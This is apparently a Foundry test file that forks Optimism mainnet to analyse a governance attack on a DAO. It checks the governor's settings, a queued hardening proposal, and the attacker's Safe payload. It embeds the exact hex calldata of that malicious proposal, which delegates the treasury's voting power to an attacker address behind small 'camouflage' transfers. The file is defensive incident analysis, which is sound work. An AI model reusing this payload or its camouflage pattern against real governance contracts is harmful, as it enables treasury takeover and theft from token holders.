// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";

interface IVotesToken {
    function balanceOf(address) external view returns (uint256);
    function delegates(address) external view returns (address);
    function getVotes(address, uint256) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function authorizedAccounts(address) external view returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IGovernor {
    function quorumNumerator() external view returns (uint256);
    function proposalThreshold() external view returns (uint256);
    function votingPeriod() external view returns (uint256);
    function votingDelay() external view returns (uint256);
    function quorum(uint256) external view returns (uint256);
    function getVotes(address, uint256) external view returns (uint256);
    function state(uint256) external view returns (uint8);
    function execute(address[] calldata, uint256[] calldata, bytes[] calldata, bytes32)
        external payable returns (uint256);
}

interface ITimelock {
    function isOperationReady(bytes32) external view returns (bool);
    function getMinDelay() external view returns (uint256);
    function hasRole(bytes32, address) external view returns (bool);
}

interface ISafe {
    function getOwners() external view returns (address[] memory);
    function getThreshold() external view returns (uint256);
    function nonce() external view returns (uint256);
}

contract HaiGovernanceTest is Test {
    address constant GOV = 0xe807f3282f3391d237BA8B9bECb0d8Ea3ba23777;
    address constant TL = 0xd68e7D20008a223dD48A6076AAf5EDd4fe80a899;
    address constant SAFE = 0xDCb421Cc4Cbb7267F3b2cAcAb44Ec18AEbEd6724;
    address constant KITE = 0xf467C7d5a4A9C4687fFc7986aC6aD5A4c81E1404;
    address constant HAI = 0x10398AbC267496E49106B07dd6BE13364D10dC71;
    address constant TARGET = 0x1472934131F7aF94f3cF2542b6121a44d236cF39;
    address constant STAKING = 0x1250f2326F04ac61Ee5aEd92fEf74BcAC6E6BC90;
    address constant MULTISEND = 0xA238CBeb142c10Ef7Ad8442C6D1f9E89e07e7761;

    address constant DEF1 = 0xCAFd432b7EcAfff352D92fcB81c60380d437E99D;
    address constant DEF2 = 0xe02e8AFcE6bfe464eDa586E3a54Ba9901Ff2C81D;
    address constant DEF3 = 0xBad58e133138549936D2576ebC33251bE841d3e9;
    address constant DEF4 = 0x35d067D337Dd3F7E2BBb4367bed467DCfae1E1fb;

    uint256 constant FORK_BLOCK = 158_341_121;
    uint256 constant HARDENING_ID =
        103806721447535921384462690981123294371878165558661022162562047341447243780649;
    bytes32 constant DESC_HASH = 0xd110f9c013e1374b0e1a455bf856f1c02080cc9a1f4b94031935686650d3b8f2;
    bytes32 constant OP_ID = 0x52aa3307449685539d09e8b83eea5982b2962b02f23d50b0cd3ef2cb129150e6;

    // Exact Safe.execTransaction calldata from attacker proposal 377946732172...
    bytes constant PAYLOAD = hex"6a761202000000000000000000000000a238cbeb142c10ef7ad8442c6d1f9e89e07e776100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000140000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000054000000000000000000000000000000000000000000000000000000000000003c48d80ff0a0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000037600f467c7d5a4a9c4687ffc7986ac6ad5a4c81e140400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044095ea7b30000000000000000000000001250f2326f04ac61ee5aed92fef74bcac6e6bc90000000000000000000000000000000000000000000000a968163f0a57b40000000f467c7d5a4a9c4687ffc7986ac6ad5a4c81e140400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044a9059cbb000000000000000000000000fed2eb6325432f0bf7110dce2ccc5ff811ac3d4d00000000000000000000000000000000000000000000001b1ae4d6e2ef50000000f467c7d5a4a9c4687ffc7986ac6ad5a4c81e140400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044095ea7b3000000000000000000000000fed2eb6325432f0bf7110dce2ccc5ff811ac3d4d000000000000000000000000000000000000000000000a968163f0a57b40000000420000000000000000000000000000000000004200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044a9059cbb000000000000000000000000468c572c41db8b206b3919ac9a41ad8de2eac8220000000000000000000000000000000000000000000000056bc75e2d6310000000f467c7d5a4a9c4687ffc7986ac6ad5a4c81e1404000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000245c19a95c0000000000000000000000001472934131f7af94f3cf2542b6121a44d236cf3900f467c7d5a4a9c4687ffc7986ac6ad5a4c81e140400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044095ea7b3000000000000000000000000468c572c41db8b206b3919ac9a41ad8de2eac82200000000000000000000000000000000000000000000021e19e0c9bab240000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000041000000000000000000000000d68e7d20008a223dd48a6076aaf5edd4fe80a89900000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000";

    function setUp() public {
        vm.createSelectFork(
            vm.envOr("OP_RPC_URL", string("https://mainnet.optimism.io")), FORK_BLOCK
        );
    }

    function test_live_state_at_fork_block() public {
        IGovernor gov = IGovernor(GOV);
        IVotesToken kite = IVotesToken(KITE);

        assertEq(gov.quorumNumerator(), 1, "quorum numerator still 1%");
        assertEq(gov.proposalThreshold(), 5_000e18, "proposal threshold still 5k KITE");
        assertEq(gov.votingPeriod(), 129_600, "voting period still 36h");
        assertEq(gov.votingDelay(), 43_200, "voting delay 12h");
        assertEq(gov.quorum(block.timestamp - 1), 9_739.67e18, "quorum 1% of supply");

        assertEq(kite.balanceOf(SAFE), 328_143.981253588267391953e18, "treasury KITE");
        assertEq(kite.delegates(SAFE), address(0), "treasury not delegated");
        assertEq(kite.authorizedAccounts(TL), true, "Timelock can mint KITE");
        assertEq(IVotesToken(HAI).authorizedAccounts(TL), true, "Timelock can mint HAI");
        assertEq(IGovernor(GOV).state(HARDENING_ID), 5, "hardening state = Queued");
        assertEq(ITimelock(TL).isOperationReady(OP_ID), true, "hardening ready");
        assertEq(ITimelock(TL).getMinDelay(), 86_400, "24h timelock");

        uint256 defense = gov.getVotes(DEF1, block.timestamp - 1)
            + gov.getVotes(DEF2, block.timestamp - 1)
            + gov.getVotes(DEF3, block.timestamp - 1)
            + gov.getVotes(DEF4, block.timestamp - 1);
        assertEq(defense, 73_936.05622312566e18, "defender bloc");
    }

    function test_hardening_executes_permissionlessly() public {
        address[] memory targets = new address[](3);
        targets[0] = GOV;
        targets[1] = GOV;
        targets[2] = GOV;
        uint256[] memory values = new uint256[](3);
        bytes[] memory calls = new bytes[](3);
        calls[0] = hex"e540d01d0000000000000000000000000000000000000000000000000000000000069780";
        calls[1] = hex"06f3f9e60000000000000000000000000000000000000000000000000000000000000005";
        calls[2] = hex"ece40cc100000000000000000000000000000000000000000000043c33c1937564800000";

        uint256 t = block.timestamp;
        vm.prank(address(0xBEEF));
        IGovernor(GOV).execute(targets, values, calls, DESC_HASH);
        vm.warp(t + 1);

        assertEq(IGovernor(GOV).quorumNumerator(), 5, "quorum -> 5%");
        assertEq(IGovernor(GOV).proposalThreshold(), 20_000e18, "threshold -> 20k");
        assertEq(IGovernor(GOV).votingPeriod(), 432_000, "voting period -> 5d");
        assertEq(IGovernor(GOV).quorum(t), 48_698.35e18, "post-harden quorum");
    }

    function test_treasury_payload_delegates_and_transfers() public {
        IVotesToken kite = IVotesToken(KITE);
        uint256 kiteBefore = kite.balanceOf(SAFE);
        uint256 fed2Before = kite.balanceOf(0xfEd2eB6325432F0bF7110DcE2CCC5fF811ac3D4D);
        uint256 opBefore = IVotesToken(0x4200000000000000000000000000000000000042).balanceOf(
            0x468c572c41DB8B206B3919AC9a41ad8dE2eAc822
        );

        // The Safe owner is the Timelock with threshold 1; the Timelock is msg.sender,
        // so the v=1 owner-approval signature in the payload validates.
        vm.prank(TL);
        (bool ok,) = SAFE.call(PAYLOAD);
        assertTrue(ok, "Safe execTransaction payload");

        uint256 t = block.timestamp;
        vm.warp(t + 1);

        assertEq(kite.delegates(SAFE), TARGET, "treasury delegated to attacker");
        assertEq(kite.getVotes(TARGET, t), 327_643.981253588267391953e18, "attacker voting power");
        assertEq(kite.balanceOf(SAFE), kiteBefore - 500e18, "500 KITE camouflage transfer");
        assertEq(
            kite.balanceOf(0xfEd2eB6325432F0bF7110DcE2CCC5fF811ac3D4D),
            fed2Before + 500e18,
            "reward distributor transfer"
        );
        assertEq(kite.allowance(SAFE, STAKING), 50_000e18, "staking approval");
        assertEq(
            IVotesToken(0x4200000000000000000000000000000000000042).balanceOf(
                0x468c572c41DB8B206B3919AC9a41ad8dE2eAc822
            ),
            opBefore + 100e18,
            "OP camouflage transfer"
        );
        assertEq(ISafe(SAFE).nonce(), 80, "safe nonce");
    }

    function test_direct_timelock_execution_blocked() public {
        address[] memory targets = new address[](1);
        targets[0] = GOV;
        uint256[] memory values = new uint256[](1);
        bytes[] memory calls = new bytes[](1);
        calls[0] = hex"";
        vm.prank(address(0xBEEF));
        (bool ok,) = TL.call(
            abi.encodeWithSignature(
                "executeBatch(address[],uint256[],bytes[],bytes32,bytes32)",
                targets,
                values,
                calls,
                bytes32(0),
                bytes32(0)
            )
        );
        assertFalse(ok, "only governor may execute timelock batch");
    }
}
